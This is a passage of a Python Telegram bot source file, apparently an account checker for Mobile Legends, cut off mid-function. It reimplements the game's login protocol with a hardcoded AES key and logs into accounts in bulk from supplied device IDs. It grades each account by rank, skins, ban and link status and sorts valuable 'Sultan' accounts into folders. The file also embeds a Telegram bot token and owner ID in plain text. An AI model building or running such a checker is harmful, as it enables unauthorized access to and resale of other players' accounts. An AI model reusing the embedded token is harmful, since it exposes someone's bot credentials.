#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - TELEGRAM BOT v1.6
# Fix: Removed tag-guessing. Only known tags used. Unknown = "--".
# Add: /debug <device_id> dumps raw SDP responses for mapping.
# Add: Ban Status line always visible in output.
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib, io
import struct, re, logging, asyncio, zipfile, shutil
from queue import Queue
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional, Union
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor
from html import escape as html_escape

import zstandard as zstd
import requests
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import BadRequest, NetworkError
from telegram.request import HTTPXRequest

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────

BOT_TOKEN   = "8728762913:AAFdnTyiBUuhZiwGQ1FxgbgSb9Y_B1HovXY"
OWNER_ID    = 8621676055
BOT_NAME    = "Shin DevID Seker"
BOT_VERSION = "1.6"

TELEGRAM_CONNECT_TIMEOUT = 60.0
TELEGRAM_READ_TIMEOUT    = 60.0
TELEGRAM_WRITE_TIMEOUT   = 60.0
TELEGRAM_POOL_TIMEOUT    = 60.0

MAX_THREADS_DEFAULT = 10
MAX_THREADS_LIMIT   = 50
MIN_THREADS         = 1

TZ_WIB = timezone(timedelta(hours=7))

BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")
DATA_DIR   = os.path.join(BASE_DIR, "data")
RESULTS_DIR = os.path.join(BASE_DIR, "Results")
DEBUG_DIR   = os.path.join(BASE_DIR, "Debug_Dumps")

for d in (DATA_DIR, RESULTS_DIR, OUTPUT_DIR, DEBUG_DIR):
    os.makedirs(d, exist_ok=True)

USERS_FILE      = Path(DATA_DIR) / "users.json"
KEYS_FILE       = Path(DATA_DIR) / "keys.json"
CONFIG_FILE     = Path(DATA_DIR) / "config.json"

# ────────────────────────────────────────────────────────────────
# MLBB PROTOCOL CONSTANTS
# ────────────────────────────────────────────────────────────────

AES_KEY        = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'

FOLDERS = {
    "detail":    "03_Hasil_Detail_8Req",
    "rank_warrior": "04_Rank_Warrior",
    "rank_elite":   "05_Rank_Elite",
    "rank_master":  "06_Rank_Master",
    "rank_gm":      "07_Rank_Grandmaster",
    "rank_epic":    "08_Rank_Epic",
    "rank_legend":  "09_Rank_Legend",
    "rank_mythic":  "10_Rank_Mythic",
    "v2l_active":   "11_V2L_Active",
    "v2l_inactive": "12_V2L_Inactive",
    "sultan":       "13_Sultan",
    "error":        "99_Error",
    "json":         "16_JSON_Export",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)

ensure_dirs()

# ────────────────────────────────────────────────────────────────
# LOGGING
# ────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
log = logging.getLogger("premiumbot")

# ────────────────────────────────────────────────────────────────
# SAFE CASTING HELPERS
# ────────────────────────────────────────────────────────────────

def _safe_int(val, default: int = 0) -> int:
    if val is None: return default
    if isinstance(val, bool): return 1 if val else 0
    if isinstance(val, int): return val
    if isinstance(val, float):
        try: return int(val)
        except: return default
    if isinstance(val, (str, bytes)):
        try:
            s = val.decode(errors='ignore') if isinstance(val, bytes) else val
            return int(float(s.strip()))
        except Exception:
            return default
    # dict / SdpStruct / list: not a scalar -> return default (NO GUESSING)
    return default

def _safe_str(val, default: str = "--") -> str:
    if val is None: return default
    if isinstance(val, str): return val
    if isinstance(val, bytes):
        try: return val.decode(errors='ignore')
        except: return default
    if isinstance(val, (int, float)): return str(val)
    return default

# ────────────────────────────────────────────────────────────────
# KNOWN TAGS  (only fields confirmed working — NO speculation)
# ────────────────────────────────────────────────────────────────

KNOWN_PD_TAGS = {
    2:  'nickname',
    3:  'level',
    8:  'current_rank_pts',
    9:  'hero_count',
    42: 'created_at',
    83: 'skin_count',
    95: 'highest_rank_pts',
}

KNOWN_SKIN_INFO_TAGS = {
    2:  'nickname',
    3:  'level',
    6:  'current_rank_pts',
    9:  'hero_count',
    10: 'skin_count',
    15: 'highest_rank_pts',
    92: 'skin_list',
}

KNOWN_ROLE_INFO_TAGS = {
    2:  'nickname',
    3:  'level',
    8:  'current_rank_pts',
    9:  'hero_count',
}

# ────────────────────────────────────────────────────────────────
# COUNTRY ID -> NAME  (from MLBB known country codes)
# ────────────────────────────────────────────────────────────────

COUNTRY_ID_MAP = {
    1: "Indonesia",    2: "Malaysia",    3: "Singapore",
    4: "Philippines",  5: "Thailand",    6: "Vietnam",
    7: "Myanmar",      8: "Cambodia",    9: "Laos",
    10: "Brunei",      11: "East Timor", 12: "India",
    13: "Bangladesh",  14: "Pakistan",   15: "Sri Lanka",
    16: "Nepal",       17: "China",      18: "Taiwan",
    19: "Hong Kong",   20: "Japan",      21: "South Korea",
    22: "Mongolia",    23: "Australia",  24: "New Zealand",
    25: "USA",         26: "Canada",     27: "Mexico",
    28: "Brazil",      29: "Argentina",  30: "Chile",
    31: "Peru",        32: "Colombia",   33: "Venezuela",
    34: "Ecuador",     35: "Bolivia",    36: "Uruguay",
    37: "Paraguay",    38: "UK",         39: "Germany",
    40: "France",      41: "Spain",      42: "Italy",
    43: "Portugal",    44: "Netherlands",45: "Belgium",
    46: "Switzerland", 47: "Austria",    48: "Sweden",
    49: "Norway",      50: "Denmark",    51: "Finland",
    52: "Poland",      53: "Czech",      54: "Hungary",
    55: "Romania",     56: "Greece",     57: "Turkey",
    58: "Russia",      59: "Ukraine",    60: "Egypt",
    61: "South Africa",62: "Nigeria",    63: "Kenya",
    64: "Morocco",     65: "Saudi Arabia",66: "UAE",
}

def map_country(country_id) -> str:
    cid = _safe_int(country_id, 0)
    if cid <= 0: return "--"
    return COUNTRY_ID_MAP.get(cid, f"Country#{cid}")

# ────────────────────────────────────────────────────────────────
# RANK MAPPING
# ────────────────────────────────────────────────────────────────

def map_rank(p) -> str:
    p = _safe_int(p, 0)
    if p <= 0:
        return "Unranked"
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50:  return f"Mythical Glory ({stars}★)"
        if stars >= 25:  return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    ranks = [
        (105, "Legend",      5, ["V","IV","III","II","I"]),
        (75,  "Epic",        5, ["V","IV","III","II","I"]),
        (45,  "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25,  "Master",      4, ["IV","III","II","I"]),
        (10,  "Elite",       3, ["IV","III","II","I"]),
        (1,   "Warrior",     3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset  = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star    = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"

def get_rank_category(rank_text: str) -> str:
    rt = str(rank_text).lower()
    if "warrior"    in rt: return "warrior"
    if "elite"      in rt: return "elite"
    if "grandmaster"in rt: return "gm"
    if "master"     in rt and "grand" not in rt: return "master"
    if "epic"       in rt: return "epic"
    if "legend"     in rt: return "legend"
    if "mythic"     in rt or "immortal" in rt or "glory" in rt or "honor" in rt: return "mythic"
    return "other"

# ────────────────────────────────────────────────────────────────
# COLLECTOR TIER MAPPING (Amateur → World)
# ────────────────────────────────────────────────────────────────

COLLECTOR_TIER_THRESHOLDS = [
    (300000, "World Collector"),
    (200000, "Global Collector"),
    (100000, "Mythic Collector"),
    (60000,  "Renowned Collector"),
    (40000,  "Legend Collector"),
    (20000,  "Epic Collector"),
    (10000,  "Grand Collector"),
    (6000,   "Master Collector"),
    (3000,   "Elite Collector"),
    (1000,   "Novice Collector"),
    (0,      "Amateur Collector"),
]

def map_collector_tier(points) -> str:
    pts = _safe_int(points, 0)
    if pts <= 0: return "--"
    for threshold, name in COLLECTOR_TIER_THRESHOLDS:
        if pts >= threshold:
            return name
    return "Amateur Collector"

# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT  = 2
    DOUBLE = 3
    STRING = 4
    LIST   = 5
    DICT   = 6
    STRUCT_BEGIN = 7
    STRUCT_END   = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data   = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr   = self.data[self.offset]
        tag   = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT:  return tag, struct.unpack("<f", self._read_varint().to_bytes(4,'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8,'little'))[0]
        if dtype == SdpDataType.STRING:
            l   = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try:    return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l   = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l   = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ────────────────────────────────────────────────────────────────
# CONNECTION
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host     = host
        self.port     = port
        self.sequence = 1
        self.socket   = None
        self.queue    = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(10)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket   = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt   = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp  = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size  = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data       = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1:  data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data   = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3:  data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None


class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei    = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid    = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()


class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id  = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei        = raw[:32] if len(raw) >= 32 else raw
        self.android     = raw[32:48] if len(raw) >= 48 else ""
        self.adid        = raw[48:] if len(raw) > 48 else ""
        self.account_id  = 0
        self.session_key = ''
        self.zone_id     = 0
        self.game_host   = ''
        self.game_port   = 0
        self.creation_ts = 0
        self.ban_status  = "NORMAL"
        self.ban_reason  = ""
        self.ban_remaining = ""
        self.last_raw_responses: Dict[str, Any] = {}

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id  = res.get(0)
            self.session_key = res[1]
            self.zone_id     = res[2][0]
            self.creation_ts = _safe_int(res.get(19, 0), 0)
            self.ban_status  = "NORMAL"
            return True
        if res and isinstance(res, dict):
            for v in res.values():
                if isinstance(v, str) and any(b in v.lower() for b in ('ban','suspend','freeze','limit')):
                    self.ban_status = f"BANNED: {v}"
                    self.ban_reason = str(v)
                    return False
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            try:
                host, port       = str(res[1]).split(':')
                self.game_host   = host
                self.game_port   = _safe_int(port, 0)
                return True
            except Exception:
                return False
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(5):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        """Query ban info. Sets self.ban_status / ban_reason / ban_remaining."""
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo  = res[0]
                reason = _safe_str(binfo.get('ban_reason', 'Unknown'), 'Unknown')
                d = _safe_int(binfo.get('endtime_day', 0), 0)
                h = _safe_int(binfo.get('endtime_hour', 0), 0)
                m = _safe_int(binfo.get('endtime_min', 0), 0)
                s = _safe_int(binfo.get('endtime_sec', 0), 0)
                self.ban_reason    = reason
                self.ban_remaining = f"{d}d {h}h {m}m {s}s"
                self.ban_status    = f"BANNED (Reason: {reason} | Remaining: {self.ban_remaining})"
                return self.ban_status
            if pid in (-1, None, 20002):
                # No ban info returned -> account is clean
                self.ban_status    = "NORMAL"
                self.ban_reason    = ""
                self.ban_remaining = ""
                break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: _safe_int(search_value, 0)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: _safe_int(role_id, 0), 2: _safe_int(zone_id, 0)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: _safe_int(role_id, 0), 1: _safe_int(zone_id, 0)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

# ────────────────────────────────────────────────────────────────
# V2L DETECTION
# ────────────────────────────────────────────────────────────────

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    for pid_req, pid_resp_list in [
        (10208, [10208]),
        (10145, [10146, 10160]),
        (10143, [10144]),
    ]:
        try:
            conn.send_data(pid_req, SdpStruct({0: _safe_int(role_id, 0), 1: _safe_int(zone_id, 0)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid in pid_resp_list and res:
                    data = dict(res)
                    for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                        val = data.get(tag)
                        if val is None:
                            nested = data.get(tag, {})
                            if isinstance(nested, dict):
                                for subtag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                                    val = nested.get(subtag)
                                    if val is not None: break
                        if val is None: continue
                        if isinstance(val, dict): continue
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1","true","enabled","yes"): return "Enabled"
                            if val.lower() in ("0","false","disabled","no"):  return "Disabled"
        except: pass
    return "N/A"

# ────────────────────────────────────────────────────────────────
# SERIALIZE SdpStruct -> plain dict (for debug + JSON)
# ────────────────────────────────────────────────────────────────

def sdp_to_plain(obj, depth=0):
    if depth > 6:
        return "…"
    if isinstance(obj, SdpStruct):
        return {str(k): sdp_to_plain(v, depth + 1) for k, v in obj.items()}
    if isinstance(obj, dict):
        return {str(k): sdp_to_plain(v, depth + 1) for k, v in obj.items()}
    if isinstance(obj, list):
        return [sdp_to_plain(x, depth + 1) for x in obj]
    if isinstance(obj, bytes):
        try: return obj.decode('utf-8')
        except: return obj.hex()
    if isinstance(obj, (int, float, str, bool)) or obj is None:
        return obj
    return str(obj)

# ────────────────────────────────────────────────────────────────
# FORMATTING  (only known fields, no guessing)
# ────────────────────────────────────────────────────────────────

def compute_account_age(created_ts) -> str:
    created_ts = _safe_int(created_ts, 0)
    if created_ts <= 0:
        return "--"
    try:
        created = datetime.fromtimestamp(created_ts, tz=timezone.utc)
        now     = datetime.now(timezone.utc)
        days_total = (now - created).days
        if days_total < 0: return "--"
        years  = days_total // 365
        rem    = days_total % 365
        months = rem // 30
        days   = rem % 30
        tag    = " - OG" if years >= 5 else ""
        return f"{years}y {months}m {days}d{tag}"
    except Exception:
        return "--"

def _fmt_ts_wib(ts) -> str:
    ts = _safe_int(ts, 0)
    if ts <= 0:
        return "--"
    try:
        return datetime.fromtimestamp(ts, tz=timezone.utc).astimezone(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "--"

# Skin tiers from skin_list (best-effort quality-id mapping; only counts if quality present)
SKIN_TIER_MAP = {21: 'supreme', 16: 'grand', 17: 'grand', 15: 'exquisite',
                 11: 'exquisite', 8: 'exquisite', 7: 'deluxe', 5: 'exceptional',
                 2: 'deluxe', 9: 'deluxe', 1: 'common'}

def parse_skin_tiers(slist) -> Dict[str, int]:
    tiers = {'supreme': 0, 'grand': 0, 'exquisite': 0,
             'deluxe': 0, 'exceptional': 0, 'common': 0}
    if isinstance(slist, list):
        for s in slist:
            if isinstance(s, dict):
                q = _safe_int(s.get(2, 0), 0)
                tier = SKIN_TIER_MAP.get(q, 'common')
                tiers[tier] += 1
    return tiers

def build_account_payload(device_id: str, acc: int, zone: int, pd: dict) -> Dict[str, Any]:
    is_banned = 'ban' in str(pd.get('ban_status', '')).lower()

    tiers = pd.get('skin_tiers') or {k: 0 for k in
             ('supreme','grand','exquisite','deluxe','exceptional','common')}

    collector_pts = _safe_int(pd.get('collector_points', 0), 0)

    payload = {
        "device_id": device_id,
        "v2l": pd.get('v2l_status', 'N/A') == 'Enabled' and 'Yes' or
               ('No' if pd.get('v2l_status') == 'Disabled' else 'N/A'),
        "status": "Banned" if is_banned else "Valid",
        "ban_reason":    pd.get('ban_reason', '') or '',
        "ban_remaining": pd.get('ban_remaining', '') or '',
        "player_info": {
            "id": acc,
            "server": zone,
            "nickname": pd.get('nickname', '--'),
            "level": _safe_int(pd.get('level', 0), 0),
            "current_heroes": _safe_int(pd.get('hero_count', 0), 0),
            "skins": _safe_int(pd.get('skin_count', 0), 0),
            "supreme_skins": _safe_int(tiers.get('supreme', 0), 0),
            "grand_skins": _safe_int(tiers.get('grand', 0), 0),
            "exquisite_skins": _safe_int(tiers.get('exquisite', 0), 0),
            "deluxe_skins": _safe_int(tiers.get('deluxe', 0), 0),
            "exceptional_skins": _safe_int(tiers.get('exceptional', 0), 0),
            "common_skins": _safe_int(tiers.get('common', 0), 0),
            "location": pd.get('location', '--'),
            "last_login": pd.get('last_login', '--'),
            "current_rank": pd.get('current_rank', 'Unranked'),
            "high_rank": pd.get('highest_rank', '--'),
            "achievement_points": _safe_int(pd.get('achievement_points', 0), 0),
            "collector_points": collector_pts,
            "collector_tier": map_collector_tier(collector_pts) if collector_pts > 0 else "--",
            "squad": pd.get('squad', '--'),
            "bindings": pd.get('bindings', '--'),
            "hero_history": pd.get('hero_history', '--'),
        },
        "extended_info": {
            "country": pd.get('country', '--'),
            "last_login_country": pd.get('last_login_country', '--'),
            "creation_country": pd.get('creation_country', '--'),
            "last_battle": pd.get('last_battle', '--'),
            "account_age": pd.get('account_age', '--'),
            "created_at": pd.get('created_at', '--'),
            "featured_skin": pd.get('featured_skin', '--'),
            "favourite_skins": pd.get('favourite_skins', '--'),
            "recent_skin": pd.get('recent_skin', '--'),
            "skin_log": pd.get('skin_log', f"{_safe_int(pd.get('skin_count',0),0)} skins tracked"),
        },
        "hero_activity": {
            "top_played": pd.get('top_played', '--'),
            "recent_matches": pd.get('recent_matches', '--'),
        },
    }
    return payload

def format_account_details_text(payload: Dict[str, Any]) -> str:
    p   = payload['player_info']
    ext = payload['extended_info']
    ha  = payload['hero_activity']

    lines = []
    lines.append("--- SUCCESS - OTHER ---")
    lines.append(f"{payload['device_id']} =>")
    lines.append(f"V2L: {payload['v2l']}")
    lines.append(f"Status: {payload['status']}")
    # Ban info always visible
    if payload['status'] == "Banned":
        lines.append(f"Ban Reason: {payload.get('ban_reason') or '--'}")
        lines.append(f"Ban Remaining: {payload.get('ban_remaining') or '--'}")
    else:
        lines.append("Ban Reason: --")
        lines.append("Ban Remaining: --")
    lines.append("---")
    lines.append("Player Info =>")
    lines.append(f"  ID: {p['id']}")
    lines.append(f"  Server: {p['server']}")
    lines.append(f"  Nickname: {p['nickname']}")
    lines.append(f"  Level: {p['level']}")
    lines.append(f"  Current Heroes: {p['current_heroes']}")
    lines.append(f"  Skins: {p['skins']}")
    lines.append(f"  Supreme Skins: {p['supreme_skins']}")
    lines.append(f"  Grand Skins: {p['grand_skins']}")
    lines.append(f"  Exquisite Skins: {p['exquisite_skins']}")
    lines.append(f"  Deluxe Skins: {p['deluxe_skins']}")
    lines.append(f"  Exceptional Skins: {p['exceptional_skins']}")
    lines.append(f"  Common Skins: {p['common_skins']}")
    lines.append(f"  Location: {p['location']}")
    lines.append(f"  Last Login: {p['last_login']}")
    lines.append(f"  Current Rank: {p['current_rank']}")
    lines.append(f"  High Rank: {p['high_rank']}")
    lines.append(f"  Achievement Points: {p['achievement_points']}")
    lines.append(f"  Collector Points: {p['collector_points']}")
    lines.append(f"  Collector Tier: {p['collector_tier']}")
    lines.append(f"  Squad: {p['squad']}")
    lines.append(f"  Bindings: {p['bindings']}")
    lines.append(f"  Hero History (Latest 5): {p['hero_history']}")
    lines.append("---")
    lines.append("Extended Info =>")
    lines.append(f"  Country: {ext['country']}")
    lines.append(f"  Last Login Country: {ext['last_login_country']}")
    lines.append(f"  Creation Country: {ext['creation_country']}")
    lines.append(f"  Last Battle: {ext['last_battle']}")
    lines.append(f"  Account Age: {ext['account_age']}")
    lines.append(f"  Created At: {ext['created_at']}")
    lines.append(f"  Featured Skin: {ext['featured_skin']}")
    lines.append(f"  Favourite Skins: {ext['favourite_skins']}")
    lines.append(f"  Recent Skin: {ext['recent_skin']}")
    lines.append(f"  Skin Log: {ext['skin_log']}")
    lines.append("---")
    lines.append("Hero Activity =>")
    lines.append(f"  Top Played (3): {ha['top_played']}")
    lines.append(f"  Recent Matches: {ha['recent_matches']}")
    return "\n".join(lines)

def format_account_details_json(payload: Dict[str, Any]) -> str:
    obj = {
        "header": {
            "device_id": payload['device_id'],
            "v2l": payload['v2l'],
            "status": payload['status'],
            "ban_reason": payload.get('ban_reason', ''),
            "ban_remaining": payload.get('ban_remaining', ''),
        },
        "player_info": payload['player_info'],
        "extended_info": payload['extended_info'],
        "hero_activity": payload['hero_activity'],
        "generated_at": datetime.now(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S WIB"),
    }
    return json.dumps(obj, indent=2, ensure_ascii=False)

def telegram_pretty_block(text: str) -> str:
    return f"<pre>{html_escape(text)}</pre>"

# ────────────────────────────────────────────────────────────────
# SAVE ENGINE
# ────────────────────────────────────────────────────────────────

HIT_COUNTERS = {
    'sultan': 0, 'v2l_active': 0, 'v2l_inactive': 0, 'banned': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0
}
COUNTER_LOCK = threading.Lock()
save_lock    = threading.Lock()

def is_already_saved(device_id: str, filepath: str) -> bool:
    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False

def save_account(account_info: dict, pd: dict, mode="detail", out_dir: str = None):
    global HIT_COUNTERS
    base = out_dir if out_dir else OUTPUT_DIR
    device   = account_info.get('Device id', '')
    acc      = account_info.get('role_id', '?')
    zone     = account_info.get('zone_id', '?')
    ban_stat = pd.get('ban_status', 'NORMAL')
    is_banned = 'ban' in str(ban_stat).lower()

    # Always save JSON
    try:
